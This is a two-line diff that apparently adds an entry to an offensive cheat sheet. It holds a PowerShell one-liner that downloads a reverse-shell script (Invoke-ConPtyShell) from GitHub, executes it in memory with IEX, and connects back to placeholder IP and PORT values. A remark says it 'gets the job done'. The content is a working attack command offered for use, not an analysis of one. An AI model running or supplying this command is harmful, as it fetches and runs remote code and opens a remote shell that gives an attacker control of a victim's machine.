@@ -1,0 +1,2 @@
+no payloads for a reason, this gets the job done.
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell IP PORT
